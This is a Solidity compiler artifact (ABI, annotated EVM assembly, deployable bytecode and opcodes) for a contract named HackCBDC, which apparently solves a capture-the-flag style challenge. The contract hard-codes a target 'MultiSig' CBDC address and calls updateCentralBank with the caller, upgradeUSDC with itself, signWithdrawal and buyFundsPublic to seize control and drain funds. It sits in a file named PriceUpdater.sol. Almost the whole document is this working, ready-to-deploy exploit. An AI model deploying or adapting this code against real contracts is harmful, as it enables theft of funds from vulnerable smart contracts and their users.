{
	"contracts/PriceUpdater.sol": {
		"HackCBDC": {
			"abi": [
				{
					"inputs": [],
					"name": "buyFundsPublic",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "signWithdrawal",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "updateCentralBank",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "upgradeUSDC",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/PriceUpdater.sol\":385:952  contract HackCBDC {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/PriceUpdater.sol\":407:472  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x00\n  dup1\n  sload\n  not(sub(exp(0x02, 0xa0), 0x01))\n  and\n    /* \"contracts/PriceUpdater.sol\":430:472  0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x550714e1fd747084fc5cb2b2e3a93512972aebda\n    /* \"contracts/PriceUpdater.sol\":407:472  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  or\n  swap1\n  sstore\n    /* \"contracts/PriceUpdater.sol\":385:952  contract HackCBDC {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/PriceUpdater.sol\":385:952  contract HackCBDC {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      div(calldataload(0x00), 0x0100000000000000000000000000000000000000000000000000000000)\n      0x132ad223\n      dup2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9b6822f8\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe9e8f34d\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xf99a1f30\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":667:743  function signWithdrawal() public {... */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n        /* \"contracts/PriceUpdater.sol\":477:568  function updateCentralBank() public {... */\n    tag_4:\n      tag_7\n      tag_10\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":748:867  function upgradeUSDC() public {... */\n    tag_5:\n      tag_7\n      tag_12\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":873:950  function buyFundsPublic() public {... */\n    tag_6:\n      tag_7\n      tag_14\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":667:743  function signWithdrawal() public {... */\n    tag_8:\n        /* \"contracts/PriceUpdater.sol\":715:719  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":706:737  MultiSig(cbdc).signWithdrawal() */\n      0x40\n      dup1\n      mload\n      0x132ad22300000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":715:719  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap3\n        /* \"contracts/PriceUpdater.sol\":706:735  MultiSig(cbdc).signWithdrawal */\n      0x132ad223\n      swap3\n        /* \"contracts/PriceUpdater.sol\":706:737  MultiSig(cbdc).signWithdrawal() */\n      0x04\n      dup1\n      dup5\n      add\n      swap4\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":715:719  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":706:737  MultiSig(cbdc).signWithdrawal() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":667:743  function signWithdrawal() public {... */\n      jump\t// out\n        /* \"contracts/PriceUpdater.sol\":477:568  function updateCentralBank() public {... */\n    tag_10:\n        /* \"contracts/PriceUpdater.sol\":528:532  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":519:563  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      mload(0x40)\n      0x077bf51a00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":552:562  msg.sender */\n      caller\n        /* \"contracts/PriceUpdater.sol\":519:563  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":528:532  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":519:551  MultiSig(cbdc).updateCentralBank */\n      0x077bf51a\n      swap1\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":519:563  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":748:867  function upgradeUSDC() public {... */\n    tag_12:\n        /* \"contracts/PriceUpdater.sol\":793:797  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":784:825  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      mload(0x40)\n      0x8cba468600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":819:823  this */\n      address\n        /* \"contracts/PriceUpdater.sol\":784:825  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":793:797  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":784:810  MultiSig(cbdc).upgradeUSDC */\n      0x8cba4686\n      swap1\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":784:825  MultiSig(cbdc).upgradeUSDC(address(this)) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":840:844  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":831:862  MultiSig(cbdc).buyFundsPublic() */\n      0x40\n      dup1\n      mload\n      0xf99a1f3000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":840:844  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap5\n      pop\n        /* \"contracts/PriceUpdater.sol\":831:860  MultiSig(cbdc).buyFundsPublic */\n      0xf99a1f30\n      swap4\n      pop\n        /* \"contracts/PriceUpdater.sol\":831:862  MultiSig(cbdc).buyFundsPublic() */\n      0x04\n      dup1\n      dup3\n      add\n      swap4\n        /* \"contracts/PriceUpdater.sol\":840:844  cbdc */\n      swap3\n        /* \"contracts/PriceUpdater.sol\":831:862  MultiSig(cbdc).buyFundsPublic() */\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":840:844  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":831:862  MultiSig(cbdc).buyFundsPublic() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":873:950  function buyFundsPublic() public {... */\n    tag_14:\n        /* \"contracts/PriceUpdater.sol\":923:927  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":914:945  MultiSig(cbdc).buyFundsPublic() */\n      0x40\n      dup1\n      mload\n      0xf99a1f3000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":923:927  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap3\n        /* \"contracts/PriceUpdater.sol\":914:943  MultiSig(cbdc).buyFundsPublic */\n      0xf99a1f30\n      swap3\n        /* \"contracts/PriceUpdater.sol\":914:945  MultiSig(cbdc).buyFundsPublic() */\n      0x04\n      dup1\n      dup5\n      add\n      swap4\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":923:927  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":914:945  MultiSig(cbdc).buyFundsPublic() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220803251e1d70920baa98ba1bb24af79f2f1a3a0c89a08fe9513ecc0b1dd3d095c64736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260008054600160a060020a03191673550714e1fd747084fc5cb2b2e3a93512972aebda17905534801561003657600080fd5b50610304806100466000396000f3fe608060405234801561001057600080fd5b5060043610610068577c01000000000000000000000000000000000000000000000000000000006000350463132ad223811461006d5780639b6822f814610077578063e9e8f34d1461007f578063f99a1f3014610087575b600080fd5b61007561008f565b005b610075610110565b61007561017b565b610075610267565b60008054604080517f132ad223000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff9092169263132ad2239260048084019382900301818387803b1580156100f657600080fd5b505af115801561010a573d6000803e3d6000fd5b50505050565b6000546040517f077bf51a00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff9091169063077bf51a90602401600060405180830381600087803b1580156100f657600080fd5b6000546040517f8cba468600000000000000000000000000000000000000000000000000000000815230600482015273ffffffffffffffffffffffffffffffffffffffff90911690638cba468690602401600060405180830381600087803b1580156101e657600080fd5b505af11580156101fa573d6000803e3d6000fd5b505060008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216945063f99a1f309350600480820193929182900301818387803b1580156100f657600080fd5b60008054604080517ff99a1f30000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff9092169263f99a1f309260048084019382900301818387803b1580156100f657600080fdfea2646970667358221220803251e1d70920baa98ba1bb24af79f2f1a3a0c89a08fe9513ecc0b1dd3d095c64736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB NOT AND PUSH20 0x550714E1FD747084FC5CB2B2E3A93512972AEBDA OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x304 DUP1 PUSH2 0x46 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x68 JUMPI PUSH29 0x100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 CALLDATALOAD DIV PUSH4 0x132AD223 DUP2 EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0x9B6822F8 EQ PUSH2 0x77 JUMPI DUP1 PUSH4 0xE9E8F34D EQ PUSH2 0x7F JUMPI DUP1 PUSH4 0xF99A1F30 EQ PUSH2 0x87 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x75 PUSH2 0x8F JUMP JUMPDEST STOP JUMPDEST PUSH2 0x75 PUSH2 0x110 JUMP JUMPDEST PUSH2 0x75 PUSH2 0x17B JUMP JUMPDEST PUSH2 0x75 PUSH2 0x267 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0x132AD22300000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP3 PUSH4 0x132AD223 SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x77BF51A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x77BF51A SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x8CBA468600000000000000000000000000000000000000000000000000000000 DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x8CBA4686 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP5 POP PUSH4 0xF99A1F30 SWAP4 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP4 SWAP3 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0xF99A1F3000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP3 PUSH4 0xF99A1F30 SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP1 ORIGIN MLOAD 0xE1 0xD7 MULMOD KECCAK256 0xBA 0xA9 DUP12 LOG1 0xBB 0x24 0xAF PUSH26 0xF2F1A3A0C89A08FE9513ECC0B1DD3D095C64736F6C6343000811 STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "154400",
						"executionCost": "20495",
						"totalCost": "174895"
					},
					"external": {
						"buyFundsPublic()": "infinite",
						"signWithdrawal()": "infinite",
						"updateCentralBank()": "infinite",
						"upgradeUSDC()": "infinite"
					}
				},
				"methodIdentifiers": {
					"buyFundsPublic()": "f99a1f30",
					"signWithdrawal()": "132ad223",
					"updateCentralBank()": "9b6822f8",
					"upgradeUSDC()": "e9e8f34d"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 107,
						"contract": "contracts/PriceUpdater.sol:HackCBDC",
						"label": "cbdc",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}